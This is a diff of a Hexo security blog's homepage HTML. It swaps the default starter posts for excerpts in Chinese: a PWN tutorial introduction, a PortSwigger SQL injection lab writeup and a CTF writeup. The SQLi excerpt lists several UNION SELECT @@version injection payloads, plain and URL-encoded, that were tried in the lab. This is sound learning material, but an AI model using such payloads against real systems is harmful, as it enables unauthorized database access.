-</ul>
-</li>
-<li><p><strong>學習心得分享</strong></p>
-<ul>
-<li>課程筆記整理</li>
-<li>實戰經驗總結</li>
-</ul>
+<p>同時會重點介紹 <strong>Hack The Box</strong> 與 <strong>Pwnable.tw</strong> 平台的挑戰，並涵蓋 Linux 與 Windows 的 Kernel Exploitation。</p>
+<h1 id="PWN-教學指南"><a href="#PWN-教學指南" class="headerlink" title="PWN 教學指南"></a>PWN 教學指南</h1><p>本指南將帶你從新手一路進階學習 PWN（<strong>Pwn</strong> 即「<strong>擁有</strong> &#x2F; <strong>攻破</strong>」的黑客俚語）相關技術，包含必要基礎知識、常見漏洞類型、實用工具介紹、實戰範例解析以及進階技巧，並提供 C&#x2F;C++ 與 Python 的實作範例。同時，我們也會強調 <strong>Kernel Exploitation（內核利用）</strong> 技術，幫助你了解在 Linux 與 Windows 核心層面的漏洞利用方法。</p>
+<h2 id="1-基礎知識與概念"><a href="#1-基礎知識與概念" class="headerlink" title="1. 基礎知識與概念"></a>1. 基礎知識與概念</h2><h3 id="PWN-是什麼？"><a href="#PWN-是什麼？" class="headerlink" title="PWN 是什麼？"></a>PWN 是什麼？</h3><p>「PWN」原是黑客圈的俚語，意思是<strong>攻破裝置或系統並取得控制權</strong>。發音類似「砰」，象徵成功駭入系統的一聲巨響。在網路安全語境中，PWN 指透過漏洞利用、社交工程等手段，成功獲得裝置、系統或網路的未授權控制權。一旦<strong>PWN</strong> 了某系統，攻擊者便可執行任意惡意操作，例如竊取資料、植入惡意程式或癱瘓系統服務。</p>
+<h3 id="CTF-中-PWN-題型介紹"><a href="#CTF-中-PWN-題型介紹" class="headerlink" title="CTF 中 PWN 題型介紹"></a>CTF 中 PWN 題型介紹</h3><p>在 CTF（Capture The Flag）競賽中，PWN 題目通常提供一個已編譯好的<strong>二進位程式</strong>（例如 Linux ELF 或 Windows PE 檔案），該程式部署在目標伺服器上。參賽者需要對這個程式進行逆向分析和動態調試，找出其中的漏洞，透過網路與服務互動並加以利用。PWN 題目的目標通常是<strong>取得遠端系統的 shell 權限</strong>或直接讀取旗標檔案。常見的 PWN 題目漏洞包含：棧&#x2F;堆緩衝區溢位、整數溢位、格式化字串漏洞等。總之，在 CTF PWN 題中，你需要發揮二進位漏洞挖掘與利用能力，突破沙盒或權限限制拿到目標系統的控制權。</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #03a9f4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Self-learning/" style="color: #ff7d73">Self-learning</a>
+        </span>
+        
+    </div>
+    <a href="/2025/02/04/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/" class="go-post">閱讀全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/01/31/portswigger-sqli-writeup/">
+        <h2 class="post-title">PortSwigger SQLi writeup</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/1/31
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="SQL injection attack, querying the database type and version on MySQL and Microsoft"></a><strong>SQL injection attack, querying the database type and version on MySQL and Microsoft</strong></h2><ol>
+<li>開始會需要用到 Burp Suite Repeater 來幫忙轉成 URL Encoding 了（而且也比較方便看 response）</li>
+<li>注意註記符號 “—” 有時候要改成 “#” 才能過</li>
+<li>曾經試過的幾個payload<ol>
+<li>Gifts‘+UNION+SELECT+@@version,+NULL#</li>
+<li>Gifts’%2bUNION%2bSELECT%2b%40%40version%2c%2bNULL%23 (上一個的URL型態)</li>
+<li>Gifts’ UNION SELECT @@version, ‘abc’ #</li>
+<li>Gifts’%20UNION%20SELECT%20%40%40version%2c%20’abc’%20%23（上一個的URL型態，命中！）</li>
+</ol>
 </li>
 </ol>
-<h2 id="📚-參考資源"><a href="#📚-參考資源" class="headerlink" title="📚 參考資源"></a>📚 參考資源</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://hexo.io/docs/">Hexo 官方文檔</a></li>
-<li><a target="_blank" rel="noopener" href="https://markdown.tw/">Markdown 語法指南</a></li>
-<li><a target="_blank" rel="noopener" href="https://owasp.org/">資訊安全相關資源</a></li>
-</ul>
-<hr>
-<p><strong>Happy Blogging! 🚀</strong></p>
-<p>開始您的技術寫作之旅吧！記住，最好的學習方式就是分享您所學到的知識。</p>
-
-      
+<p><img src="https://hackmd.io/_uploads/SJjoZ4IOyg.png" alt="image"></p>
+<p>結論：”+”不能亂加，然後要試試看 URL型態，而且註記符號要多試試看 ”#”</p>
+            
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://owld.tw/2025/06/29/Hexo-Website-Setup-Complete/" data-id="cmchewvwp0000ysdb2q7wdc86" data-title="Hexo 網站建立完成！" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%B6%B2%E7%AB%99%E5%BB%BA%E7%AB%8B/" rel="tag">網站建立</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%83%A8%E8%90%BD%E6%A0%BC/" rel="tag">部落格</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/06/29/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2025-06-29T08:22:58.286Z" itemprop="datePublished">2025-06-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    <div class="post-tags">
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/06/29/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://owld.tw/2025/06/29/hello-world/" data-id="cmchev25g0000esdbady56811" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
         
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">分類</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/">學習筆記</a></li></ul></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">標籤</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%B6%B2%E7%AB%99%E5%BB%BA%E7%AB%8B/" rel="tag">網站建立</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%83%A8%E8%90%BD%E6%A0%BC/" rel="tag">部落格</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">標籤雲</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/%E7%B6%B2%E7%AB%99%E5%BB%BA%E7%AB%8B/" style="font-size: 10px;">網站建立</a> <a href="/tags/%E9%83%A8%E8%90%BD%E6%A0%BC/" style="font-size: 10px;">部落格</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">彙整</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
         
-          <li>
-            <a href="/2025/06/29/Hexo-Website-Setup-Complete/">Hexo 網站建立完成！</a>
-          </li>
         
-          <li>
-            <a href="/2025/06/29/hello-world/">Hello World</a>
-          </li>
+        <span class="tag">
+            
+            <a href="/tags/Self-learning/" style="color: #00a596">Self-learning</a>
+        </span>
         
-      </ul>
+        <span class="tag">
+            
+            <a href="/tags/PortSwigger/" style="color: #03a9f4">PortSwigger</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/SQLi/" style="color: #00bcd4">SQLi</a>
+        </span>
+        
     </div>
-  </div>
+    <a href="/2025/01/31/portswigger-sqli-writeup/" class="go-post">閱讀全文</a>
+</div>
 
-  
-</aside>
+<div class="post">
+    <a href="/2025/01/16/2025-tscctf-writeup/">
+        <h2 class="post-title">2025 TSCCTF writeup</h2>
+    </a>
+    <div class="category-and-date">
         
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2025 Owl NoSleep<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/1/16
+        </span>
+        
+        
     </div>
-  </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="2025-TSCCTF-owl-d-writeup"><a href="#2025-TSCCTF-owl-d-writeup" class="headerlink" title="2025 TSCCTF owl_d writeup"></a>2025 TSCCTF owl_d writeup</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><h3 id="Give-you-a-free-flag"><a href="#Give-you-a-free-flag" class="headerlink" title="Give you a free flag"></a>Give you a free flag</h3><p><img src="https://hackmd.io/_uploads/HyswtsHwJe.png" alt="image"><br>反白就可以找到flag</p>
+<h3 id="Please-join-our-discord"><a href="#Please-join-our-discord" class="headerlink" title="Please join our discord"></a>Please join our discord</h3><p><img src="https://hackmd.io/_uploads/SJgaKoHP1l.png" alt="image"><br>在announcement這裡<br>（我找了一天 哭）</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #ff7d73">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/TSCCTF/" style="color: #ffa2c4">TSCCTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/01/16/2025-tscctf-writeup/" class="go-post">閱讀全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <span class="current">1</span>
+    
+    
+    
+    
+</div>
+
+    </div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/avatar.jpg" alt="avatar" />
+        </div>
+        <div class="name">owl_d</div>
+        <div class="description">
+            <p>OWL_D 網絡安全技術部落格<br>專注於分享網絡安全、滲透測試<br>與各種技術心得</p>
+
+        </div>
+        
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/owl-nosleep">
+                    <i
+                        class="fa-brands fa-github fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://hackmd.io/@owld">
+                    <i
+                        class="fa-solid fa-pen-to-square fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://linkedin.com">
+                    <i
+                        class="fa-brands fa-linkedin fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+        </div>
+        
+        
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://nckuctf.org/?fbclid=IwY2xjawJPDglleHRuA2FlbQIxMAABHd3AvtQdToPPmnDnaLx3ePSAbRUlekigYijFd-nWQGAMIxUNrurDdgna1Q_aem_M-BXAmjsy2TwTzx69YNlFw">NCKUCTF</a>
+            </div>
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+            </div>
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a>
+            </div>
+            
+        </div>
+        
+    </div>
+</div>
+
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 OWL_D Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;owl_d
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
 </footer>
 
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+    <script src="/js/main.js"></script>
     
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
 </body>
 </html>
